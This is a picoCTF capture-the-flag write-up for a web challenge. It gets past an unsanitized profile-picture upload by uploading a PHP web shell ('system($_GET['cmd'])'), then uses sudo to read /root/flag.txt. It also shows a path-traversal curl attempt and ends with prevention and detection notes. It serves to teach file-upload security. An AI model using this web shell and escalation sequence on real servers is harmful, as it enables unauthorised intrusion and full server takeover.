# n0s4n1ty 1
>picoCTF
>
>Web Exploitation

> ***A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the /root directory.***

> ### Hints:
> 1. File upload was not sanitized
> 2. Whenever you get a shell on a remote machine, check sudo -l
 
## Initial Thoughts:

- Based on the hints, ssh will be of some use here
	- may need to verify which port is accessible if using the url alone doesn't work
- If file upload isn't sanitized, I may be able to upload a script or a picture with embedded commands to gain access to something on the site.

## Info Gathering:
- Website source
	- found the following script:

            var loadFile = function(event) {
            var input = event.target;
            var file = input.files[0];
            var type = file.type;
            var output = document.getElementById('preview_img');


            output.src = URL.createObjectURL(event.target.files[0]);
            output.onload = function() {
                URL.revokeObjectURL(output.src) // free memory
   
- Functionality
	- Upon upload, files get sent to "uploads/[filename]"
		- Can I convert code execution into a photo? cyberchef maybe?
			- doesn't do anything by itself
	- going to the directory created by the file upload views the file, but nothing else
- Path Traversal(?)
	- curl http://chatelaine.cylabacademy.net:38452/ -F "filename=@flag.txt;filename=../../root/*"
		- based on a command found in research
			- didn't work
- Web Shell Upload
	- <?php echo file_get_contents('/root'); ?>
		- returns:

                "Warning: file_get_contents(/root): Failed to open stream: Permission denied in /var/www/html/uploads/test.php on line 1"
		
      - means that the system attempted to run the command. (On the right track)
        
	- http://xebec.cylabacademy.net:33808/upload.php?cmd=sudo_-l
		- Returns the following:

                Warning: Undefined array key "fileToUpload" in /var/www/html/upload.php on line 3
            
                Warning: Trying to access array offset on null in /var/www/html/upload.php on line 3
            
                Deprecated: basename(): Passing null to parameter #1 ($path) of type string is deprecated in /var/www/html/upload.php on line 3
            
                Warning: Undefined array key "fileToUpload" in /var/www/html/upload.php on line 16
            
                Warning: Trying to access array offset on null in /var/www/html/upload.php on line 16
            
                Deprecated: move_uploaded_file(): Passing null to parameter #1 ($from) of type string is deprecated in /var/www/html/upload.php on line 16
                Sorry, there was an error uploading your file.

- [NEW] Updated PHP file & found way to run commands via shell
		- test.php >>> <?php system($_GET['cmd']) ?>
		- [URL]/[path to uploaded file]?cmd=ls
			- reads out the contents of the current directory
		- combined with sudo -l gives temporary super access to run commands
	
		

## Solution:

### Solution 1 (Initial Attempt - Web Shell Upload):

1. Access the site
2. In a text editor, create a payload PHP file with the following: <?php system($_GET['cmd']) ?>
3. Use the site's upload feature to upload your payload file
4. Change your URL to take you to the directory where your file is stored. (in my case, http://xebec.cylabacademy.net:16426**/uploads/test.php**
5. Append the following webshell commands as needed:
    - ...?cmd=sudo -l (gives temporary access to run all commands in the server; part of the provided hints)
    - ...?cmd=ls (reads out the contents of the current directory)
    - ...?cmd=sudo ls /root (allows us to see what's in the /root directory; flag should be here as per description
    - ...?cmd=sudo cat /root/flag.txt (prints the contents of the found flag file)

    
## Review:

### Notes:

File Upload Attacks & Vulnerability

- A file upload attack is used when a poorly secured server allows unrestricted or unsanitized file uploads from clients who access it
    - The client accessing the server can inject malicious code into a file with certain triggers
        - Example: a stored Cross-Side Scripting vulnerability triggering when it's been viewed by another user on the server
    - From the server's end, this exploit shows in the form of arbitrary code execution once the file is uploaded.
        - If the server has poor restrictions or configurations, this could result in unrestricted command execution, potentially giving up control of the server to the attacker
    
- How it works on the server-side:
    - file is uploaded with a .php extension -> file is transferred to a PHP execution engine -> engine interprets the contents of the file, executes the included instructions, and generates output -> server sends the results back as a HTTP response without the PHP code included

### Vulnerabilities Discovered:

1. Allows unsanitized file upload, creating an attack surface for malicious files
2. Remote command execution via uploaded webshell
3. No size limits for uploads, potentially leading to DoS attacks

### How To Prevent:

1. Whitelisting only expected file extensions (.jpg, .png, .pdf)
    - Validates file types and avoids bypass strategies such as stringing extensions together (ex. image.jpg.php)
2. Reject file names containing special characters such as '../'
    - Avoids potential path traversal scenarios
3. Hiding the directory where the files are stores upon upload via a dedicated server script OR renaming files with random identities (hashing algos, UUID, etc.)
    - The exploit relies on knowing where the uploaded file is located in order to take advantage of the vulnerabilty
4. Implement file size limits
5. Check the MIME type and signing of the file upon upload
    - Validate the Content-Type and magic bytes of the file to confirm that it's actually the file type that it claims to be

### How To Detect:

1. Deploy a trusted WAF (Web Application Firewall) to detect and block malicious uploads
2. Log file upload attempts that get rejected based on prevention rules mentioned above, ensuring to capture identifiers from the client side such as IP for blocklisting

## References

- https://community.owasp.org/vulnerabilities/Unrestricted_File_Upload
- https://medium.com/purplebox/methods-for-exploiting-file-upload-vulnerabilities-c046f9946b62
- https://www.vaadata.com/en/blog/file-upload-vulnerabilities-and-security-best-practices/
- https://medium.com/@tareshsharma17/simple-php-reverse-shell-061d4a6bd18d
